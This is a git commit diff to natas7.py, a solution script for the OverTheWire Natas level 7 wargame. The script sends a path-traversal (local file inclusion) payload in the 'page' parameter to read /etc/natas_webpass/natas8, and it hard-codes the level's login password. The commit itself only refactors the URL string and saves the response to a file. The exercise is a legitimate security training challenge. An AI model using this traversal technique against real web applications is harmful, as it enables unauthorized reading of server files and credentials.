39dca2ec51873c017bfceca39f77dd72ecbe2b06
Romain <rmtestard@gmail.com>
2019-02-03 20:28:14 +0100

    Local File Inclusion

--- natas7.py
+++ natas7.py
@@ -6,12 +6,15 @@ import re
 username = 'natas7'
 password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
 
-url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8' % username
+url = f'http://{username}.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'
 
 response = requests.get(url, auth=(username, password))
 content = response.text
+output = open('output.html', 'w')
+output.write(content)
+
 
 print(content)
-print(re.findall('<br>\n(.*)\n\n<!--', content))
+# print(re.findall('<br>\n(.*)\n\n<!--', content))
 
 # Local File Inclusion
